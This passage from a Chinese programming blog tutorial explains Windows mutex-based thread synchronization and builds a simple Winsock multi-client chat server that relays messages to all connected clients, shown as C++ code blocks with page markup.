class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相较于之前改动不大，关键在于：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadInc</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//相当于上锁</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//用完解锁</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadDes</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个线程在运行的时候，他要等待其中一个线程先<code>ReleaseMutex</code>。其中谁先开始仍然是随机的。</p><img src="/2022/07/18/thread/012.png" class=""><p>可以看到这次得到理想的值了。</p><blockquote><p>这个互斥对象的意义就是在线程运行的时候，让他处于等待通知状态，执行完毕之后在释放所有权，这样可以避免多个线程快速对内存的操作的影响</p></blockquote><hr><h2 id="socket-互斥线程同步"><a href="#socket-互斥线程同步" class="headerlink" title="socket+互斥线程同步"></a>socket+互斥线程同步</h2><p>简单就是聊天服务器和客户端的low low版本</p><img src="/2022/07/18/thread/013.png" class=""><ol><li>socket bind listen accept必不可少</li><li>c&#x2F;s的模式</li><li>上线的客户端，通过服务器新起一个线程维护管理</li><li>收到的消息如何发送给客户端</li><li>当客户端下线后，需要断开这个线程的连接</li></ol><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>前面的代码其实都差不多，直接copy以前的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个互斥对象</span></span><br><span class="line">hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);<span class="comment">//不被子进程继承 不获取所有权 互斥对象没有名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start listen!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addrCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接收消息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">//来自客户端的连接</span></span><br><span class="line">SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addrCli, &amp;len);</span><br><span class="line"><span class="comment">//启用线程处理客户端</span></span><br><span class="line">clnSocks[clntCnt++] = sockConn;<span class="comment">//clntCnt++ 右边自增，效果一样</span></span><br><span class="line"></span><br><span class="line">hThread = (HWND)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, HandleCln, (<span class="type">void</span> *)&amp;sockConn, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Connect Num = %d, client ip: %s\n&quot;</span>,clntCnt, <span class="built_in">inet_ntoa</span>(addrCli.sin_addr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>循环接收消息上处理会有不同，毕竟要处理多个客户端，还有队列中下线某台，后面的移上来。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转发消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span> *szMsg, <span class="type">int</span> iLen)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="built_in">send</span>(clnSocks[i], szMsg, iLen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理消息的线程</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">HandleCln</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET*)arg);</span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">//收到的消息转发给客户端</span></span><br><span class="line"><span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时连接数：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="comment">//客户端下线过程 12345 其中一台下线后面的补上</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (hClntSock == clnSocks[i])&#123;</span><br><span class="line"><span class="comment">//确认某台客户端下线，可以移除掉</span></span><br><span class="line"><span class="keyword">while</span> (i++ &lt; clntCnt)&#123;</span><br><span class="line">clnSocks[i] = clnSocks[i + <span class="number">1</span>];<span class="comment">//某台下线后，就把后面的移上来</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//移除结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除之后总数-1</span></span><br><span class="line">clntCnt--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;断开后，此时连接数为：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线程和网络编程和队列都有了，线程同步的问题还没解决，就是给他上锁。<br>上锁的核心就是线程对全局变量的处理太快，产生偏差值的问题，所以我们在循环处理中对全局变量做改变的前后加上锁。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line">clnSocks[clntCnt++] = sockConn;<span class="comment">//clntCnt++ 右边自增，效果一样</span></span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转发消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span> *szMsg, <span class="type">int</span> iLen)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="built_in">send</span>(clnSocks[i], szMsg, iLen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理消息的线程</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">HandleCln</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET*)arg);</span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">//收到的消息转发给客户端</span></span><br><span class="line"><span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时连接数：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="comment">//客户端下线过程 12345 其中一台下线后面的补上</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (hClntSock == clnSocks[i])&#123;</span><br><span class="line"><span class="comment">//确认某台客户端下线，可以移除掉</span></span><br><span class="line"><span class="keyword">while</span> (i++ &lt; clntCnt)&#123;</span><br><span class="line">clnSocks[i] = clnSocks[i + <span class="number">1</span>];<span class="comment">//某台下线后，就把后面的移上来</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//移除结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除之后总数-1</span></span><br><span class="line">clntCnt--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;断开后，此时连接数为：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>完整的服务端</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CLNT 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">SOCKET clnSocks[MAX_CLNT];<span class="comment">//所有连接的客户端的socket</span></span><br><span class="line"><span class="type">int</span> clntCnt = <span class="number">0</span>;<span class="comment">//客户端连接的个数</span></span><br><span class="line"></span><br><span class="line">HANDLE hMutex;<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转发消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span> *szMsg, <span class="type">int</span> iLen)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="built_in">send</span>(clnSocks[i], szMsg, iLen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理消息的线程</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">HandleCln</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET*)arg);</span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">//收到的消息转发给客户端</span></span><br><span class="line"><span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时连接数：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="comment">//客户端下线过程 12345 其中一台下线后面的补上</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (hClntSock == clnSocks[i])&#123;</span><br><span class="line"><span class="comment">//确认某台客户端下线，可以移除掉</span></span><br><span class="line"><span class="keyword">while</span> (i++ &lt; clntCnt)&#123;</span><br><span class="line">clnSocks[i] = clnSocks[i + <span class="number">1</span>];<span class="comment">//某台下线后，就把后面的移上来</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//移除结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除之后总数-1</span></span><br><span class="line">clntCnt--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;断开后，此时连接数为：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个互斥对象</span></span><br><span class="line">hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);<span class="comment">//不被子进程继承 不获取所有权 互斥对象没有名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start listen!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addrCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接收消息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">//来自客户端的连接</span></span><br><span class="line">SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addrCli, 